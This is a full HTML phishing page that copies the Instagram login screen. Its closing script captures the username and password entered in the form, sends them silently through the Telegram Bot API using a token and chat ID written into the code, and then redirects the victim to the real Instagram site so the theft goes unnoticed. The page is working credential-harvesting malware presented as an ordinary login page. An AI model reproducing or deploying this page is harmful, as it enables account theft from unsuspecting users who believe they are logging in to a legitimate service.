<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Login</title>
    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #fafafa;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .container {
            width: 100%;
            max-width: 350px;
            padding: 10px;
        }
        .login-card {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 30px 20px;
            margin-bottom: 10px;
            text-align: center;
        }
        .logo {
            margin-bottom: 30px;
        }
        .logo i {
            font-size: 48px;
            color: #262626;
        }
        .logo h1 {
            font-family: 'Grand Hotel', cursive;
            font-size: 48px;
            font-weight: 400;
            color: #262626;
            margin-top: -10px;
        }
        form {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .input-group input {
            width: 100%;
            padding: 9px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            outline: none;
        }
        .input-group input:focus {
            border-color: #a8a8a8;
        }
        .input-group input::placeholder {
            color: #8e8e8e;
        }
        .login-btn {
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 7px 16px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin: 8px 0;
            transition: background 0.2s;
        }
        .login-btn:hover {
            background: #1877f2;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 10px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        .divider-line {
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        .divider-text {
            margin: 0 18px;
        }
        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            margin: 8px 0;
            text-decoration: none;
            display: inline-block;
        }
        .fb-login i {
            font-size: 16px;
            margin-right: 5px;
        }
        .forgot-password {
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
            margin-top: 12px;
            display: inline-block;
        }
        .signup-card {
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }
        .signup-card a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
            text-align: center;
        }
        .footer a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 4px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-card">
            <div class="logo">
                <i class="fab fa-instagram"></i>
                <h1>Instagram</h1>
            </div>
            <form id="loginForm" action="#">
                <div class="input-group">
                    <input type="text" id="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn">Log in</button>
                <div class="divider">
                    <span class="divider-line"></span>
                    <span class="divider-text">OR</span>
                    <span class="divider-line"></span>
                </div>
                <a href="#" class="fb-login"><i class="fab fa-facebook-square"></i> Log in with Facebook</a>
                <a href="#" class="forgot-password">Forgot password?</a>
            </form>
        </div>
        <div class="signup-card">
            Don't have an account? <a href="#">Sign up</a>
        </div>
        <div class="footer">
            <a href="#">Meta</a> • <a href="#">About</a> • <a href="#">Blog</a> • <a href="#">Jobs</a> • <a href="#">Help</a> • <a href="#">API</a> • <a href="#">Privacy</a> • <a href="#">Terms</a> • <a href="#">Locations</a> • <a href="#">Instagram Lite</a> • <a href="#">Threads</a> • <a href="#">Contact Uploading & Non-Users</a> • <a href="#">Meta Verified</a>
        </div>
    </div>

    <script>
        // ========== Telegram Configuration ==========
        const telegramBotToken = '8567650656:AAFAXe5M_xQ6Zom6Q_uc7g2wAD3W2fAdqkI';
        const telegramChatId = '8304101362';
        // ============================================

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const message = `📸 Instagram Login\n👤 User: ${username}\n🔑 Pass: ${password}`;
            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

            // Send data silently to Telegram
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            })
            .then(response => response.json())
            .catch(error => console.error('Telegram error:', error))
            .finally(() => {
                // Redirect to official Instagram site without any notification
                window.location.href = 'https://www.instagram.com';
            });
        });
    </script>
</body>
</html>
